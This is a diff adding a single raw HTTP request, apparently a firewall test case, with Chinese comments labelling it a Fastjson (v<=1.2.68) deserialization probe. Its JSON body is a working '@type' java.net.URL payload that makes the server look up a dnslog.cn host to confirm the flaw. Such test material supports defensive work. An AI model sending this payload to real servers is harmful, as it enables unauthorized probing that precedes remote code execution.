@@ -1,0 +1,11 @@
+# Fastjson反序列化(v<=1.2.68)_dnslog
+# 利用Fastjson_1.2.68远程命令执行漏洞发起dns请求访问dnslog进行信息探测
+POST /?acid=80002141&bid=hd_tag_m8mv257k HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv257k
+RM-PRO-Token: 03af386f3a54551565728c6f6f3bce4e
+RM-PRO-Time: 1742808448171
+User-Agent: curl/7.83.1
+Content-Type: application/json
+
+{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"1oboea.dnslog.cn"}}""}
